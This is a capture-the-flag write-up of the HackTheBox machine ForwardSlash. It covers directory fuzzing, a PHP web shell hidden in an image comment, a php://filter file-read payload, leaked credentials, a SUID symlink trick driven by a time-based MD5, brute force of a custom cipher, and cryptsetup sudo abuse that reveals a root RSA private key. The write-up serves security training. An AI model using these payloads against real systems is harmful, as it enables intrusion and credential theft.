---
layout: post
title:  ForwardSlash
categories: hackthebox
tags: [hackthebox, linux, hard, php, hacked, encryption, cryptsetup, InfoSecJack, chivato]
lang: "en"
image:
    path: assets/images/hackthebox/forwardslash/preview.png
    width: 300
    height: 300
---

![ForwardSlash](../../../../assets/images/hackthebox/forwardslash/forwardslash.jpg)

# abstract

ForwardSlash is a great, hard rated machine on (hackthebox.eu)[https://hackthebox.eu] made by (InfoSecJack)[https://twitter.com/infosecjack] and chivato.
To get shell access you need to find a backup of the hacked website and exploit it again. After that, you have to outsmart a backup tool from the user pain.
The root access is done by cracking or brute force of a self-written encryption tool.

# enumeration

## nmap

First things first, the nmap scan. The result lists only port 22 an port 80 so far.

```bash
# Nmap 7.80 scan initiated Tue Jun  2 11:21:05 2020 as: nmap -sC -sV -o init.nmap forwardslash.htb
Nmap scan report for forwardslash.htb (10.10.10.183)
Host is up (0.034s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Backslash Gang
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  2 11:21:14 2020 -- 1 IP address (1 host up) scanned in 8.81 seconds
```

### Port 80

![forwardslash.htb](../../../../assets/images/hackthebox/forwardslash/0_forwardslash.htb.png)

Wow the website seems to be defaced. But there is nothing special, neither in the picture nor in the source code.
So let's try to find something interesting with ffuf.

#### ffuf forwardslash.htb

I have to find out that the index file is a php file, so I have to change the extensions to look for more .php files.
Additionally, the hack in mind, I added .txt for notes and .sh for useful scripts.

```bash
kali@kali:~$ ./ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://forwardslash.htb/FUZZ -e .php,.txt,.sh

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://forwardslash.htb/FUZZ
 :: Extensions       : .php .txt .sh
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

...
note.txt                [Status: 200, Size: 216, Words: 39, Lines: 5]
```

Well, nothing interesting instead of the note.txt file.

```
Pain, we were hacked by some skids that call themselves the "Backslash Gang"... I know... That name... 
Anyway I am just leaving this note here to say that we still have that backup site so we should be fine.

-chiv
```

Ok, there is a backup of the website somewhere. With a bit of guessing, I found out that backup.forwardslash.htb hosts the backup.

![backup.forwardslash.htb](../../../../assets/images/hackthebox/forwardslash/1_backup.forwardslash.htb.png)

A login form, but I have no credentials and the usual creds like "admin:admin" didn't work.
So it's time for another round for ffuf.

#### ffuf backup.forwardslash.htb

```bash
kali@kali:~$ ./ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://backup.forwardslash.htb/FUZZ -e .php,.txt,.sh

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2                                                                 
________________________________________________

 :: Method           : GET                                                    
 :: URL              : http://backup.forwardslash.htb/FUZZ
 :: Extensions       : .php .txt .sh 
 :: Follow redirects : false                                                  
 :: Calibration      : false                                                  
 :: Timeout          : 10                                                     
 :: Threads          : 40                                                     
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________
index.php               [Status: 302, Size: 1, Words: 1, Lines: 1]
login.php               [Status: 200, Size: 1267, Words: 336, Lines: 40]
register.php            [Status: 200, Size: 1490, Words: 426, Lines: 42]
welcome.php             [Status: 302, Size: 33, Words: 6, Lines: 1]
dev                     [Status: 301, Size: 332, Words: 20, Lines: 10]
api.php                 [Status: 200, Size: 127, Words: 22, Lines: 2]
environment.php         [Status: 302, Size: 0, Words: 1, Lines: 1]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
hof.php                 [Status: 302, Size: 0, Words: 1, Lines: 1]
server-status           [Status: 403, Size: 288, Words: 20, Lines: 10]
```

There is a register.php which let us create our own account.

![register.php](../../../../assets/images/hackthebox/forwardslash/2_register.php.png)

So I created my account and login successfully.

![login](../../../../assets/images/hackthebox/forwardslash/3_login.png)

Now let's take a look. The message is not very useful.

![message](../../../../assets/images/hackthebox/forwardslash/4_message.png)

The only way so far to interact with the website is to change my profile picture, but the form is disabled.

![profilepicture.php](../../../../assets/images/hackthebox/forwardslash/5_change_profilepicture.png)

Maybe it's only disabled on the client site, let's try and remove the disabled attribute.

![disabled](../../../../assets/images/hackthebox/forwardslash/6_disabled.png)

From other machines I had the feeling that only urls are allowed that refer to an image.
So I download the defaced.png image from the startpage and added php code to the comment field.

```bash
kali@kali:~$ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' defaced.png
kali@kali:~$ exiftool defaced.png 
ExifTool Version Number         : 12.01
File Name                       : defaced.png
Directory                       : .
File Size                       : 69 kB
File Modification Date/Time     : 2020:06:02 12:19:47-04:00
File Access Date/Time           : 2020:06:02 12:22:39-04:00
File Inode Change Date/Time     : 2020:06:02 12:20:13-04:00
File Permissions                : rwxrwx---
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 841
Image Height                    : 1287
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Exif Byte Order                 : Little-endian (Intel, II)
Bits Per Sample                 : 8 8 8
X Resolution                    : 42.98
Y Resolution                    : 42.98
Resolution Unit                 : cm
Software                        : GIMP 2.10.8
Photometric Interpretation      : YCbCr
Samples Per Pixel               : 3
Thumbnail Offset                : 272
Thumbnail Length                : 4866
XMP Toolkit                     : XMP Core 4.4.0-Exiv2
Document ID                     : adobe:docid:photoshop:7a6401f7-7fb4-11e9-aa40-9e2a0a332d20
Instance ID                     : xmp.iid:1f4cc0e1-911f-4cc7-96f6-9da5c821ac25
Original Document ID            : xmp.did:6afb364d-9354-784d-97b7-e4f0a63a04dd
Api                             : 2.0
Platform                        : Linux
Time Stamp                      : 1558956857985221
Version                         : 2.10.8
Format                          : image/png
Color Space                     : Uncalibrated
Exif Image Width                : 841
Exif Image Height               : 1287
Color Mode                      : RGB
Document Ancestors              : 6A37182BFC060F417EEAB2E554A83575, CB31EBE0CDC324AFB70E49F7748FD4C8
Orientation                     : Horizontal (normal)
Create Date                     : 2019:05:26 13:39:06+01:00
Creator Tool                    : GIMP 2.10
Metadata Date                   : 2019:05:26 13:48:22+01:00
Location Created                : 
Location Shown                  : 
Artwork Or Object               : 
Registry ID                     : 
History Action                  : created, saved, saved
History Instance ID             : xmp.iid:6afb364d-9354-784d-97b7-e4f0a63a04dd, xmp.iid:68d2f01e-aab1-2143-8136-b201c75840c0, xmp.iid:c7425007-2d74-4bff-8cd1-9e177099d117
History Software Agent          : Adobe Photoshop CC 2015 (Windows), Adobe Photoshop CC 2015 (Windows), Gimp 2.10 (Linux)
History When                    : 2019:05:26 13:39:06+01:00, 2019:05:26 13:48:22+01:00, +01:00
History Changed                 : /, /
Image Supplier                  : 
Image Creator                   : 
Copyright Owner                 : 
Licensor                        : 
Background Color                : 40 26 26
Pixels Per Unit X               : 4298
Pixels Per Unit Y               : 4298
Pixel Units                     : meters
Modify Date                     : 2019:05:27 11:34:17
Comment                         : <?php echo "<pre>"; system($_GET[cmd]); ?>
Image Size                      : 841x1287
Megapixels                      : 1.1
Thumbnail Image                 : (Binary data 4866 bytes, use -b option to extract)
```

Lets try.

```bash
kali@kali:~$ python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.183 - - [05/Jul/2020 07:03:35] "GET /defaced.png HTTP/1.0" 200 -
```

The access to my local webserver works, but it seems that the image is not saved on the server.

![file_access](../../../../assets/images/hackthebox/forwardslash/7_access_successfully.png)

In the second try I used burp to capture the request.

![burp](../../../../assets/images/hackthebox/forwardslash/8_burp_captured_request.png)

So maybe it's possible to modify the url attribute with a php function refered to [this](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/).

This was my original request.
```bash
POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://backup.forwardslash.htb/profilepicture.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Connection: close
Cookie: PHPSESSID=uo0h87rn28qnns04bcgvipcdfs
Upgrade-Insecure-Requests: 1

url=http%3A%2F%2F10.10.14.6%3A8000%2Fdefaced_mod.php.png
```

This is my modified request.
```bash
POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://backup.forwardslash.htb/profilepicture.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Connection: close
Cookie: PHPSESSID=uo0h87rn28qnns04bcgvipcdfs
Upgrade-Insecure-Requests: 1

url=php://filter/convert.base64-encode/resource=/var/www/backup.forwardslash.htb/dev/index.php
```

Yeah, after the regular website there is something base64 encoded.

![burp](../../../../assets/images/hackthebox/forwardslash/9_burp_read_php.png)

It's the index.php file.
```php
<?php
//include_once ../session.php;
// Initialize the session
session_start();

if((!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true || $_SESSION['username'] !== "admin") && $_SERVER['REMOTE_ADDR'] !== "127.0.0.1"){
    header('HTTP/1.0 403 Forbidden');
    echo "<h1>403 Access Denied</h1>";
    echo "<h3>Access Denied From ", $_SERVER['REMOTE_ADDR'], "</h3>";
    //echo "<h2>Redirecting to login in 3 seconds</h2>"
    //echo '<meta http-equiv="refresh" content="3;url=../login.php" />';
    //header("location: ../login.php");
    exit;
}
?>
<html>
	<h1>XML Api Test</h1>
	<h3>This is our api test for when our new website gets refurbished</h3>
	<form action="/dev/index.php" method="get" id="xmltest">
		<textarea name="xml" form="xmltest" rows="20" cols="50"><api>
    <request>test</request>
</api>
</textarea>
		<input type="submit">
	</form>

</html>

<!-- TODO:
Fix FTP Login
-->

<?php
if ($_SERVER['REQUEST_METHOD'] === "GET" && isset($_GET['xml'])) {

	$reg = '/ftp:\/\/[\s\S]*\/\"/';
	//$reg = '/((((25[0-5])|(2[0-4]\d)|([01]?\d?\d)))\.){3}((((25[0-5])|(2[0-4]\d)|([01]?\d?\d))))/'

	if (preg_match($reg, $_GET['xml'], $match)) {
		$ip = explode('/', $match[0])[2];
		echo $ip;
		error_log("Connecting");

		$conn_id = ftp_connect($ip) or die("Couldn't connect to $ip\n");

		error_log("Logging in");

		if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {

			error_log("Getting file");
			echo ftp_get_string($conn_id, "debug.txt");
		}

		exit;
	}

	libxml_disable_entity_loader (false);
	$xmlfile = $_GET["xml"];
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$api = simplexml_import_dom($dom);
	$req = $api->request;
	echo "-----output-----<br>\r\n";
	echo "$req";
}

function ftp_get_string($ftp, $filename) {
    $temp = fopen('php://temp', 'r+');
    if (@ftp_fget($ftp, $temp, $filename, FTP_BINARY, 0)) {
        rewind($temp);
        return stream_get_contents($temp);
    }
    else {
        return false;
    }
}

?>
```

Nice, the credentials for a ftp access are hardcoded.

```php
if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/'))
```

Maybe it works in ssh.

```bash
kali@kali:~$ ssh chiv@forwardslash.htb
chiv@forwardslash.htb's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul  5 11:22:22 UTC 2020

  System load:  0.0                Processes:            168
  Usage of /:   31.0% of 19.56GB   Users logged in:      0
  Memory usage: 13%                IP address for ens33: 10.10.10.183
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 packages can be updated.
0 updates are security updates.


Last login: Tue Mar 24 11:34:37 2020 from 10.10.14.3
```

Bingo, I'm on the machine, but chiv has no user.txt

# privilege escalation from chiv to pain

## LinEnum

Maybe LinEnum find something useful.

```bash
-e [-] SUID files:
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 43088 Jan  8 18:31 /bin/mount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 26696 Jan  8 18:31 /bin/umount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 40152 Oct 10  2019 /snap/core/8268/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root root 27608 Oct 10  2019 /snap/core/8268/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/8268/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/8268/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/8268/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/8268/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 Jan 27 14:28 /snap/core/8689/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/8689/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/8689/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/8689/bin/su
-rwsr-xr-x 1 root root 27608 Jan 27 14:28 /snap/core/8689/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/8689/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/8689/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/8689/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/8689/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/8689/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jan 31 18:37 /snap/core/8689/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Nov 29  2019 /snap/core/8689/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/8689/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Feb 12 16:34 /snap/core/8689/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/8689/usr/sbin/pppd
-rwsr-xr-x 1 root root 149080 Jan 31 17:18 /usr/bin/sudo
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-r-sr-xr-x 1 pain pain 13384 Mar  6 10:06 /usr/bin/backup
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-sr-x 1 root root 109432 Oct 30  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-e
...
-e [-] Location and Permissions (if accessible) of .bak file(s):
-rw------- 1 root root 730 Mar 17 20:13 /var/backups/group.bak
-rw------- 1 root shadow 604 Mar 17 20:13 /var/backups/gshadow.bak
-rw------- 1 root shadow 1174 Mar  6 14:21 /var/backups/shadow.bak
-rw------- 1 root root 1660 Mar  5 14:46 /var/backups/passwd.bak
-rw------- 1 pain pain 526 Jun 21  2019 /var/backups/config.php.bak
-e
...
```

## exploit

In /usr/bin/ is a backup executable which is used with a suid bit. 

The other interesting file is /var/backups/config.php.bak, which is only accessible by the user pain.

Let's execute the backup executable, maybe it leads to something.

![backup](../../../../assets/images/hackthebox/forwardslash/10_backup.png)

The hash in the error message has 32 digests, so it seems to be md5. Also the time is displayed.
Let's try to recreate the hash without a linebreak.

```bash
chiv@forwardslash:~$ echo -n 14:44:22 | md5sum
399b9c288404e46fce5d456f84f3e4fc  -
```

That was successful, but since I don't want to wait for the exact time, I build a small script.

```bash
#!/bin/bash
ln -s /var/backups/config.php.bak $(echo -n $(date +%H:%M:%S) | md5sum | awk '{print $1}')
backup
```

![getPassword](../../../../assets/images/hackthebox/forwardslash/11_getPassword.png)

There are the creds, let's try to login as pain with the password db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704.

![userflag](../../../../assets/images/hackthebox/forwardslash/12_userflag.png)

# privilege escalation from pain to root

The user pain has sudo permissions for cryptsetup. But I bet we need a password to decrypt the container.

```bash
pain@forwardslash:~$ sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
```

Let's take a look into the note.txt:

```
pain@forwardslash:~$ cat note.txt 
Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.

-chiv
```

In the directory encryptorinator is the encrypter.py file which contains the algorithm to decrypt the secret message.

```python
def encrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in key:
        for i in range(len(msg)):
            if i == 0:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
            else:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])

            while tmp > 255:
                tmp -= 256
            msg[i] = chr(tmp)
    return ''.join(msg)

def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)


print encrypt('REDACTED', 'REDACTED')
print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))
```

To be honest, I didn't try to break the encryption and made my life easy with a brute force attack.

```python
def encrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in key:
        for i in range(len(msg)):
            if i == 0:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
            else:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])

            while tmp > 255:
                tmp -= 256
            msg[i] = chr(tmp)
    return ''.join(msg)

def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)


with open('ciphertext', 'rb') as f:
      check = f.read()

#print encrypt('REDACTED', 'REDACTED')
rockyou = open('/usr/share/wordlists/rockyou.txt', 'rb')
for line in rockyou:
    out = decrypt(line, check)
    print line + " : " + out
```

I redirected the output to a new file and read it manually. The non-printable characters did a lot to find a valid string.

![decrypt](../../../../assets/images/hackthebox/forwardslash/13_decrypt.png)

Here is the valid string in zoom.

![decrypt zoom](../../../../assets/images/hackthebox/forwardslash/14_decrypt_zoom.png)

The next part is to decrypt the backup file in the recovery folder.

```bash
pain@forwardslash:/home/chiv$ sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
pain@forwardslash:/home/chiv$ cd /var/backups/recovery
pain@forwardslash:/var/backups/recovery$ sudo /sbin/cryptsetup luksOpen encrypted_backup.img backup
Enter passphrase for encrypted_backup.img: 
pain@forwardslash:/var/backups/recovery$ cd /
pain@forwardslash:/$ sudo /bin/mount /dev/mapper/backup ./mnt/
pain@forwardslash:/$ ls /mnt
id_rsa
pain@forwardslash:/$ cat /mnt/id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK
RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf
yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc
u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu
NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9
MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa
V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg
G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO
3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC
vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p
MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD
Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn
5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs
V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg
e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8
6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh
i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq
tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW
woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi
/vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA
1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW
J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr
OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw
ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo
ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o
-----END RSA PRIVATE KEY-----
```

Nice it works. Now I have to download the key and try it with the root user.

![rooted](../../../../assets/images/hackthebox/forwardslash/15_rooted.png)

That's it, we are root :)